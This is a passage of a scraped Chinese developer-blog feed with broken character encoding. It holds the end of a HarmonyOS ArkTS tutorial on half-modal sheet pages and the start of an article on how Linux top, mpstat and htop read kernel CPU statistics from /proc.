Â Â <span class="hljs-keyword">@State</span>Â <span class="hljs-attribute">selectedDate</span>:Date=newÂ Date();
Â Â <span class="hljs-comment">//Â å¤‡æ³¨ä¿¡æ¯ï¼šç•™ç©ºï¼Œç­‰ç”¨æˆ·åæ§½ç”¨</span>
Â Â <span class="hljs-keyword">@State</span>Â <span class="hljs-attribute">remark</span>:string=<span class="hljs-string">""</span>;

Â Â <span class="hljs-comment">//Â åˆ›å»ºåŠæ¨¡æ€é¡µé¢çš„æ–¹æ³•ï¼šå°±åƒæ­ç§¯æœ¨ï¼ŒæŠŠç»„ä»¶å †èµ·æ¥</span>
Â Â <span class="hljs-keyword">@Builder</span>
Â Â createSheet()Â {
Â Â Â Â <span class="hljs-built_in">Column</span>({Â space:Â <span class="hljs-number">10</span>Â })Â {Â <span class="hljs-comment">//Â åˆ—å¸ƒå±€ï¼Œç»„ä»¶ä¸Šä¸‹æ’ï¼Œé—´è·10px</span>
Â Â Â Â Â Â <span class="hljs-built_in">Row</span>({Â space:Â <span class="hljs-number">10</span>Â })Â {Â <span class="hljs-comment">//Â è¡Œå¸ƒå±€ï¼Œç»„ä»¶å·¦å³æ’ï¼Œé—´è·10px</span>
Â Â Â Â Â Â Â Â Text("çºªå¿µæ—¥ï¼š")Â <span class="hljs-comment">//Â æ ‡ç­¾ï¼Œå‘Šè¯‰ç”¨æˆ·è¿™æ˜¯é€‰æ—¥æœŸçš„åœ°æ–¹</span>
Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â æ—¥å†é€‰æ‹©å™¨ï¼šå³è¾¹å¯¹é½ï¼Œå­—ä½“é¢œè‰²éªšæ°”çº¢ï¼Œç‚¹å‡»èƒ½é€‰æ—¥æœŸ</span>
Â Â Â Â Â Â Â Â <span class="hljs-built_in">CalendarPicker</span>({Â hintRadius:Â <span class="hljs-number">10</span>,Â selected:Â this.selectedDateÂ })
Â Â Â Â Â Â Â Â Â Â <span class="hljs-selector-class">.edgeAlign</span>(CalendarAlign.END)
Â Â Â Â Â Â Â Â Â Â <span class="hljs-selector-class">.textStyle</span>({Â color:Â "#ff182431",Â font:Â {Â size:Â <span class="hljs-number">20</span>,Â weight:Â FontWeight.NormalÂ }Â })
Â Â Â Â Â Â Â Â Â Â <span class="hljs-selector-class">.margin</span>(<span class="hljs-number">10</span>)
Â Â Â Â Â Â Â Â Â Â <span class="hljs-selector-class">.onChange</span>((value)Â =&gt;Â {Â <span class="hljs-comment">//Â é€‰å®Œæ—¥æœŸæ‰“å°æ—¥å¿—ï¼Œæ–¹ä¾¿debug</span>
Â Â Â Â Â Â Â Â Â Â Â Â console<span class="hljs-selector-class">.info</span>("CalendarPickerÂ onChange:"Â +Â JSON.stringify(value))
Â Â Â Â Â Â Â Â Â Â })
Â Â Â Â Â Â }
Â Â Â Â Â Â <span class="hljs-selector-class">.margin</span>({Â top:Â <span class="hljs-number">30</span>Â })Â <span class="hljs-comment">//Â ä¸Šè¾¹è·30pxï¼Œå’Œä¸Šé¢çš„ç»„ä»¶éš”å¼€</span>
Â Â Â Â Â Â <span class="hljs-selector-class">.width</span>("<span class="hljs-number">90%</span>")Â <span class="hljs-comment">//Â å®½åº¦å çˆ¶å®¹å™¨90%ï¼Œé˜²æ­¢æ’‘ç ´å±å¹•</span>

Â Â Â Â Â Â <span class="hljs-built_in">Row</span>()Â {Â <span class="hljs-comment">//Â å¤‡æ³¨è¾“å…¥æ¡†åŒºåŸŸ</span>
Â Â Â Â Â Â Â Â Text("å¤‡æ³¨ï¼š")Â <span class="hljs-comment">//Â æ ‡ç­¾</span>
Â Â Â Â Â Â Â Â <span class="hljs-built_in">TextInput</span>({Â placeholder:Â "è¯·è¾“å…¥å¤‡æ³¨ä¿¡æ¯"Â })Â <span class="hljs-comment">//Â è¾“å…¥æ¡†ï¼Œæç¤ºç”¨æˆ·â€œå¿«å†™ç‚¹ä»€ä¹ˆâ€</span>
Â Â Â Â Â Â Â Â Â Â <span class="hljs-selector-class">.onChange</span>(vÂ =&gt;Â {Â //Â è¾“å…¥å†…å®¹å®æ—¶æ›´æ–°åˆ°remarkå˜é‡
Â Â Â Â Â Â Â Â Â Â Â Â this.remarkÂ =Â v
Â Â Â Â Â Â Â Â Â Â })
Â Â Â Â Â Â }
Â Â Â Â Â Â <span class="hljs-selector-class">.width</span>("<span class="hljs-number">90%</span>")Â <span class="hljs-comment">//Â åŒæ ·å 90%å®½åº¦</span>

Â Â Â Â Â Â <span class="hljs-comment">//Â ç¡®è®¤ä¿å­˜æŒ‰é’®ï¼šç‚¹å‡»åå¼¹Toastï¼Œå…³é—­å¼¹çª—</span>
Â Â Â Â Â Â <span class="hljs-selector-tag">Button</span>("ç¡®è®¤ä¿å­˜")
Â Â Â Â Â Â Â Â <span class="hljs-selector-class">.width</span>("<span class="hljs-number">80%</span>")Â <span class="hljs-comment">//Â æŒ‰é’®çª„ä¸€ç‚¹ï¼Œæ˜¾å¾—ç²¾è‡´</span>
Â Â Â Â Â Â Â Â <span class="hljs-selector-class">.onClick</span>(()Â =&gt;Â {
Â Â Â Â Â Â Â Â Â Â this<span class="hljs-selector-class">.getUIContext</span>()<span class="hljs-selector-class">.getPromptAction</span>()<span class="hljs-selector-class">.showToast</span>({
Â Â Â Â Â Â Â Â Â Â Â Â message:Â "çºªå¿µæ—¥ï¼š"Â +Â this.selectedDate.toDateString()Â +Â "Â å¤‡æ³¨ï¼š"Â +Â this<span class="hljs-selector-class">.remark</span>
Â Â Â Â Â Â Â Â Â Â })
Â Â Â Â Â Â Â Â Â Â this<span class="hljs-selector-class">.isShow</span>Â =Â false;Â <span class="hljs-comment">//Â å…³é—­å¼¹çª—ï¼Œä¸–ç•Œæ¸…å‡€</span>
Â Â Â Â Â Â Â Â })
Â Â Â Â }
Â Â Â Â <span class="hljs-selector-class">.width</span>("<span class="hljs-number">90%</span>")Â <span class="hljs-comment">//Â æ•´ä¸ªåŠæ¨¡æ€å†…å®¹åŒºå 90%å®½åº¦</span>
Â Â Â Â <span class="hljs-selector-class">.padding</span>(<span class="hljs-number">20</span>)Â <span class="hljs-comment">//Â å†…è¾¹è·20pxï¼Œé˜²æ­¢å†…å®¹æŒ¤æˆä¸€å›¢</span>
Â Â }

Â Â <span class="hljs-comment">//Â ä¸»é¡µé¢å¸ƒå±€ï¼šä¸€ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»æ‰“å¼€åŠæ¨¡æ€</span>
Â Â <span class="hljs-built_in">build</span>()Â {
Â Â Â Â <span class="hljs-built_in">Column</span>({space:<span class="hljs-number">20</span>}){
Â Â Â Â Â Â Text("åŠæ¨¡æ€é¡µé¢")Â <span class="hljs-comment">//Â æ ‡é¢˜ï¼Œç®€å•ç²—æš´</span>
Â Â Â Â Â Â <span class="hljs-selector-tag">Button</span>("æ‰“å¼€åŠæ¨¡æ€é¡µé¢")Â <span class="hljs-comment">//Â æŒ‰é’®ï¼Œç‚¹å‡»è§¦å‘â€œå¼€å…³â€</span>
Â Â Â Â Â Â Â Â <span class="hljs-selector-class">.bindSheet</span>($$this.isShow,this.createSheet,
Â Â Â Â Â Â Â Â Â Â {mode:SheetMode.EMBEDDED,Â detents:Â [SheetSize.MEDIUM,Â SheetSize.LARGE,Â <span class="hljs-number">300</span>]})
Â Â Â Â Â Â Â Â <span class="hljs-selector-class">.onClick</span>(()=&gt;{Â <span class="hljs-comment">//Â ç‚¹å‡»æ—¶æŠŠâ€œå¼€å…³â€æ‰“å¼€ï¼ˆisShowè®¾ä¸ºtrueï¼‰</span>
Â Â Â Â Â Â Â Â Â Â this<span class="hljs-selector-class">.isShow</span>=true;
Â Â Â Â Â Â Â Â })
Â Â Â Â }
Â Â Â Â <span class="hljs-selector-class">.height</span>('<span class="hljs-number">100%</span>')Â <span class="hljs-comment">//Â æ’‘æ»¡å±å¹•é«˜åº¦</span>
Â Â Â Â <span class="hljs-selector-class">.width</span>('<span class="hljs-number">100%</span>')Â <span class="hljs-comment">//Â æ’‘æ»¡å±å¹•å®½åº¦</span>
Â Â }
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4f05c829f714266aa8a373d94f91a99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYRmVyaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472895&amp;x-signature=opM3P7ETgnrQroBP3Cna8wqflE0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73c741ee960440eabe074ae28c960aae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYRmVyaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472895&amp;x-signature=K2ecpCnWzXyy6yHThJnPqN8rd30%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">æ•ˆæœé¢„è§ˆï¼šä»â€œä¸‘æ‹’â€åˆ°â€œçœŸé¦™â€çš„èœ•å˜ğŸ“±</h3>
<ul>
<li><strong>æ‰“å¼€å‰</strong>ï¼šä¸»é¡µé¢å¹²å¹²å‡€å‡€ï¼Œåªæœ‰ä¸€ä¸ªâ€œæ‰“å¼€â€æŒ‰é’®ï¼Œåƒç­‰å¾…æ‹†å°çš„å¿«é€’ç›’ã€‚</li>
<li><strong>æ‰“å¼€å</strong>ï¼šåŠæ¨¡æ€ä»åº•éƒ¨æ»‘å‡ºï¼Œå¸¦ç€æ—¥å†å’Œè¾“å…¥æ¡†ï¼Œä»¿ä½›å¼¹å‡ºä¸€ä¸ªâ€œç§˜å¯†å°æŠ½å±‰â€ã€‚</li>
<li><strong>æ“ä½œä¸­</strong>ï¼šæ»‘åŠ¨é€‰æ‹©æ—¥æœŸã€è¾“å…¥å¤‡æ³¨ï¼Œåº•å±‚é¡µé¢â€œè™šåŒ–â€ä½†ä¸æ¶ˆå¤±ï¼Œéšæ—¶æé†’ä½ â€œæˆ‘è¿˜åœ¨è¿™å„¿å‘¢â€ã€‚</li>
<li><strong>å…³é—­æ—¶</strong>ï¼šä¾§æ»‘ã€ç‚¹è’™å±‚æˆ–ç‚¹å‡»æŒ‰é’®ï¼Œå¼¹çª—é¡ºæ»‘æ¶ˆå¤±ï¼Œä»¿ä½›ä¸€åˆ‡æ²¡å‘ç”Ÿè¿‡ï¼ˆä½†æ•°æ®å·²ç»ä¿å­˜å•¦ï½ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-6">æ€»ç»“ï¼šæ¨¡æ€é¡µé¢ä¸ºä»€ä¹ˆé¦™ï¼ŸğŸ¤”</h2>
<ul>
<li><strong>çµæ´»åº¦é«˜</strong>ï¼šåŠæ¨¡æ€/å…¨æ¨¡æ€éšæ„åˆ‡æ¢ï¼Œé€‚é…ä¸åŒåœºæ™¯ï¼ˆè€ƒè¯•ç­”é¢˜å¡ç”¨å…¨æ¨¡æ€ï¼Œé€‰æ—¥æœŸç”¨åŠæ¨¡æ€ï¼‰ã€‚</li>
<li><strong>ä½“éªŒå‹å¥½</strong>ï¼šä¸é®æŒ¡ä¸»ç•Œé¢ï¼Œæ“ä½œé€»è¾‘ç¬¦åˆç›´è§‰ï¼ˆä¾§æ»‘å…³é—­è¶…é¡ºæ‰‹ï¼‰ã€‚</li>
<li><strong>è‡ªå®šä¹‰å¼º</strong>ï¼šä»å¸ƒå±€åˆ°äº¤äº’å…¨é è‡ªå·±å†™ï¼Œæƒ³å¤šé…·ç‚«å°±å¤šé…·ç‚«ï¼ˆæ¯”å¦‚ç»™ç­”é¢˜å¡åŠ ä¸ªæ»‘åŠ¨ç¿»é¡µæ•ˆæœï¼‰ã€‚</li>
</ul>
<p>ä¸‹æ¬¡å‡†å¤‡èŠèŠå…¨æ¨¡æ€é¡µé¢çš„å®æˆ˜æ¡ˆä¾‹ï¼Œæ¯”å¦‚å¦‚ä½•ç”¨å®ƒåšä¸€ä¸ªâ€œæ²‰æµ¸å¼è€ƒè¯•ç­”é¢˜å¡â€ï½å¦‚æœä½ åœ¨å¼€å‘ä¸­é‡åˆ°ä»€ä¹ˆå¥‡è‘©é—®é¢˜ï¼Œæ¬¢è¿ç•™è¨€åæ§½ï¼Œå’±ä»¬ä¸€èµ·æäº‹æƒ…ï¼ğŸ’ª</p>
<blockquote>
<p>å¦‚æœå¤§å®¶æƒ³è€ƒå–é¸¿è’™å¼€å‘è€…è®¤è¯çš„ï¼Œæ¬¢è¿åŠ å…¥æˆ‘çš„ä¸“å±è€ƒè¯•é“¾æ¥ä¸­ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2F6ce9d5a998724a849ec634f318107d37%3Ftype%3D1%3Fha_source%3Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/6ce9d5a998724a849ec634f318107d37?type=1?ha_source=hmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">developer.huawei.com/consumer/cnâ€¦</a></p>
</blockquote>
<p><strong>å›å¿—æ‰€å‘ï¼Œä¸€å¾€æ— å‰ï¼</strong> æˆ‘æ˜¯Feriï¼Œä¸€ä¸ªä¸“æ³¨ç¨‹åºå‘˜æˆé•¿çš„è€å¸æœºï¼Œä¸‹æ¬¡è§ï½ğŸš—ğŸ’¨</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux topã€mpstatã€htop åŸç†è¯¦è§£]]></title>    <link>https://juejin.cn/post/7584057497205882923</link>    <guid>https://juejin.cn/post/7584057497205882923</guid>    <pubDate>2025-12-16T06:53:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584057497205882923" data-draft-id="7584057497205866539" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux topã€mpstatã€htop åŸç†è¯¦è§£"/> <meta itemprop="keywords" content="åµŒå…¥å¼"/> <meta itemprop="datePublished" content="2025-12-16T06:53:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Shawn_CH"/> <meta itemprop="url" content="https://juejin.cn/user/4074114702122217"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux topã€mpstatã€htop åŸç†è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4074114702122217/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Shawn_CH
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:53:14.000Z" title="Tue Dec 16 2025 06:53:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»38åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. æ¦‚è¿°</h2>
<h3 data-id="heading-1">1.1 å·¥å…·ä¸å†…æ ¸çš„å…³ç³»</h3>
<p>topã€mpstatã€htop è¿™ä¸‰ä¸ªå·¥å…·éƒ½æ˜¯é€šè¿‡è¯»å– Linux å†…æ ¸æä¾›çš„ <code>/proc</code> æ–‡ä»¶ç³»ç»Ÿæ¥è·å–ç³»ç»Ÿç»Ÿè®¡ä¿¡æ¯çš„ã€‚å®ƒä»¬æœ¬èº«å¹¶ä¸è¿›è¡Œç»Ÿè®¡ï¼Œè€Œæ˜¯è¯»å–å†…æ ¸å·²ç»ç»Ÿè®¡å¥½çš„æ•°æ®ï¼Œç„¶åè¿›è¡Œè®¡ç®—å’Œå±•ç¤ºã€‚</p>
<p><strong>æ•°æ®æµå‘</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">å†…æ ¸ç»Ÿè®¡æ¨¡å—ï¼ˆæ—¶é’Ÿä¸­æ–­ã€è¿›ç¨‹åˆ‡æ¢ç­‰ï¼‰
  â†“
æ›´æ–°å†…æ ¸æ•°æ®ç»“æ„ï¼ˆkcpustatã€task_struct ç­‰ï¼‰
  â†“
/proc æ–‡ä»¶ç³»ç»Ÿï¼ˆè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿæ¥å£ï¼‰
  â†“
ç”¨æˆ·ç©ºé—´å·¥å…·ï¼ˆtopã€mpstatã€htopï¼‰
  â†“
è¯»å–ã€è®¡ç®—ã€æ˜¾ç¤º
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>ç»Ÿè®¡å‘ç”Ÿåœ¨å†…æ ¸</strong>ï¼šæ‰€æœ‰ç»Ÿè®¡éƒ½åœ¨å†…æ ¸ä¸­å®Œæˆ</li>
<li><strong>å·¥å…·åªè´Ÿè´£è¯»å–å’Œè®¡ç®—</strong>ï¼šå·¥å…·è¯»å–å†…æ ¸æ•°æ®ï¼Œç„¶åè®¡ç®—ç™¾åˆ†æ¯”ã€å·®å€¼ç­‰</li>
<li><strong>å®æ—¶æ€§</strong>ï¼šæ¯æ¬¡è¯»å– <code>/proc</code> æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å®æ—¶ç”Ÿæˆæ•°æ®</li>
</ol>
<h3 data-id="heading-2">1.2 å†…æ ¸ç»Ÿè®¡çš„æ ¸å¿ƒæœºåˆ¶</h3>
<p><strong>æ—¶é’Ÿä¸­æ–­ï¼ˆTimer Interruptï¼‰</strong>ï¼š</p>
<p>Linux å†…æ ¸é€šè¿‡æ—¶é’Ÿä¸­æ–­å®šæœŸæ›´æ–°ç»Ÿè®¡ä¿¡æ¯ã€‚æ¯æ¬¡æ—¶é’Ÿä¸­æ–­æ—¶ï¼ˆé€šå¸¸æ¯ 1-10 æ¯«ç§’ï¼Œå–å†³äº HZ é…ç½®ï¼‰ï¼š</p>
<ol>
<li>æ›´æ–°å½“å‰è¿›ç¨‹çš„ CPU æ—¶é—´</li>
<li>æ›´æ–°ç³»ç»Ÿè´Ÿè½½</li>
<li>æ›´æ–°è¿›ç¨‹çŠ¶æ€</li>
</ol>
<p><strong>è¿›ç¨‹åˆ‡æ¢</strong>ï¼š</p>
<p>è¿›ç¨‹åˆ‡æ¢æ—¶ï¼Œå†…æ ¸ä¼šï¼š</p>
<ol>
<li>ä¿å­˜å‰ä¸€ä¸ªè¿›ç¨‹çš„ç»Ÿè®¡ä¿¡æ¯</li>
<li>æ¢å¤ä¸‹ä¸€ä¸ªè¿›ç¨‹çš„ç»Ÿè®¡ä¿¡æ¯</li>
<li>æ›´æ–°è¿›ç¨‹åˆ‡æ¢è®¡æ•°å™¨</li>
</ol>
<p><strong>å…³é”®æ•°æ®ç»“æ„</strong>ï¼š</p>
<ol>
<li><strong><code>kcpustat</code></strong>ï¼šæ¯ä¸ª CPU çš„ç»Ÿè®¡ä¿¡æ¯</li>
<li><strong><code>task_struct</code></strong>ï¼šæ¯ä¸ªè¿›ç¨‹çš„ç»Ÿè®¡ä¿¡æ¯</li>
<li><strong><code>avenrun</code></strong>ï¼šç³»ç»Ÿè´Ÿè½½å¹³å‡å€¼æ•°ç»„</li>
</ol>
<hr/>
<h2 data-id="heading-3">2. å†…æ ¸ CPU ç»Ÿè®¡åŸç†</h2>
<h3 data-id="heading-4">2.1 CPU æ—¶é—´ç»Ÿè®¡çš„æ›´æ–°æœºåˆ¶</h3>
<p><strong>æ—¶é’Ÿä¸­æ–­è§¦å‘ç»Ÿè®¡æ›´æ–°</strong>ï¼š</p>
<p>æ¯æ¬¡æ—¶é’Ÿä¸­æ–­æ—¶ï¼ˆ<code>scheduler_tick()</code>ï¼‰ï¼Œå†…æ ¸ä¼šè°ƒç”¨ <code>account_process_tick()</code> æ¥æ›´æ–°å½“å‰è¿›ç¨‹çš„ CPU æ—¶é—´ç»Ÿè®¡ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/core.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">scheduler_tick</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rq</span> *<span class="hljs-title">rq</span> =</span> cpu_rq(cpu);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">curr</span> =</span> rq-&gt;curr;
    
    <span class="hljs-comment">// æ›´æ–°è¿è¡Œé˜Ÿåˆ—æ—¶é’Ÿ</span>
    update_rq_clock(rq);
    
    <span class="hljs-comment">// æ›´æ–°å½“å‰è¿›ç¨‹çš„è°ƒåº¦ä¿¡æ¯</span>
    curr-&gt;sched_class-&gt;task_tick(rq, curr, <span class="hljs-number">0</span>);
    
    <span class="hljs-comment">// æ›´æ–°å…¨å±€è´Ÿè½½</span>
    calc_global_load_tick(rq);
}
</code></pre>
<p><strong>account_process_tick() çš„å·¥ä½œåŸç†</strong>ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">account_process_tick</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, <span class="hljs-type">int</span> user_tick)</span>
{
    u64 cputime = TICK_NSEC;  <span class="hljs-comment">// ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸçš„æ—¶é—´ï¼ˆçº³ç§’ï¼‰</span>
    u64 steal = steal_account_process_time(ULONG_MAX);
    
    cputime -= steal;
    
    <span class="hljs-keyword">if</span> (user_tick)
        account_user_time(p, cputime);  <span class="hljs-comment">// ç”¨æˆ·ç©ºé—´æ—¶é—´</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((p != this_rq()-&gt;idle) || (irq_count() != HARDIRQ_OFFSET))
        account_system_time(p, HARDIRQ_OFFSET, cputime);  <span class="hljs-comment">// å†…æ ¸ç©ºé—´æ—¶é—´</span>
    <span class="hljs-keyword">else</span>
        account_idle_time(cputime);  <span class="hljs-comment">// ç©ºé—²æ—¶é—´</span>
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ol>
<li><strong>TICK_NSEC</strong>ï¼šä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸçš„æ—¶é—´ï¼ˆé€šå¸¸ 1-10 æ¯«ç§’ï¼Œå–å†³äº HZ é…ç½®ï¼‰</li>
<li><strong>user_tick</strong>ï¼šæ ‡å¿—ä½ï¼Œè¡¨ç¤ºè¿™ä¸ªæ—¶é’Ÿå‘¨æœŸæ˜¯åœ¨ç”¨æˆ·ç©ºé—´è¿˜æ˜¯å†…æ ¸ç©ºé—´</li>
<li><strong>steal time</strong>ï¼šè™šæ‹ŸåŒ–ç¯å¢ƒä¸­è¢«å…¶ä»–è™šæ‹Ÿæœºå ç”¨çš„æ—¶é—´</li>
</ol>
<h3 data-id="heading-5">2.2 account_user_time() çš„è¯¦ç»†å®ç°</h3>
<p><strong>account_user_time() çš„ä½œç”¨</strong>ï¼š</p>
<p>å°†ç”¨æˆ·ç©ºé—´çš„ CPU æ—¶é—´ç´¯åŠ åˆ°è¿›ç¨‹å’Œå…¨å±€ç»Ÿè®¡ä¸­ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">account_user_time</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, u64 cputime)</span>
{
    <span class="hljs-comment">// 1. ç´¯åŠ åˆ°è¿›ç¨‹çš„ç”¨æˆ·ç©ºé—´æ—¶é—´</span>
    p-&gt;utime += cputime;
    account_group_user_time(p, cputime);
    
